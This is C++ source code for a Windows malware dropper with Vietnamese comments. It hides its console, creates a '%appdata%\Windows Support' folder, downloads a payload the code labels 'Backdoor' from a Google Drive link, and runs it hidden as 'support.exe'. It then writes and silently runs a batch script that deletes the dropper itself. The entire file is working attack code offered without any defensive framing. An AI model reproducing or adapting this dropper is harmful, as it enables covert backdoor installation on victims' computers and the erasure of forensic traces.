#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <Urlmon.h>
#include <string>
#pragma comment(lib, "urlmon.lib")

#define BUFSIZE 1000

std::wstring m_file;
std::wstring m_bat;
std::wstring m_path;



void init()
{
    WCHAR buf[BUFSIZE];
    memset(buf, 0, sizeof(buf));
    GetEnvironmentVariable(L"appdata", buf, sizeof(buf));
    m_path = std::wstring(buf) + L"\\Windows Support\\";
    m_file = m_path + L"support.exe";   
    m_bat = m_path + L"support.bat";    

    // tạo thư mục %appdata%\Windows Support
    CreateDirectory(m_path.c_str(), NULL);
}


void downloadMalware()
{
    // Backdoor
    std::wstring url = L"https://drive.google.com/u/0/uc?id=1ekwrTJ5sfmx7DvGG6J5KzcS027ihnacZ&export=download";

    HRESULT res = URLDownloadToFile(NULL, url.c_str(), m_file.c_str(), 0, NULL);
    if (res == S_OK) {
        printf("Ok\n");
    }
    else if (res == E_OUTOFMEMORY) {
        printf("Buffer length invalid, or insufficient memory\n");
    }
    else if (res == INET_E_DOWNLOAD_FAILURE) {
        printf("URL is invalid\n");
    }
    else {
        printf("Other error: %d\n", res);
    }
}


void selfDestruct()
{
    // Tạo bat script để nó xoá file thực thi khi chạy xong
    WCHAR buf[] = L":Repeat\r\ndel \"%s\"\r\nif exist \"%s\" goto Repeat\r\ndel \"%s\"";
    WCHAR bat[BUFSIZE * 2];
    WCHAR filename[BUFSIZE];
    FILE* fp;

    HMODULE hModule = GetModuleHandle(NULL);
    memset(filename, 0, sizeof(filename));
    GetModuleFileName(hModule, filename, sizeof(filename));

    memset(bat, 0, sizeof(bat));
    wsprintf(bat, buf, filename, filename, m_bat.c_str());

    _wfopen_s(&fp,m_bat.c_str(), L"w, ccs=UTF-8");
    fwprintf(fp, bat);
    fclose(fp);

    ShellExecute(NULL,L"open",m_bat.c_str(),NULL,NULL,SW_HIDE);

}


int wmain(int argc, _TCHAR* argv[])
{
    FreeConsole();
    init();
    downloadMalware();
    ShellExecute(NULL, L"open", m_file.c_str(), NULL, NULL, SW_HIDE);
    selfDestruct();
    return 0;
}
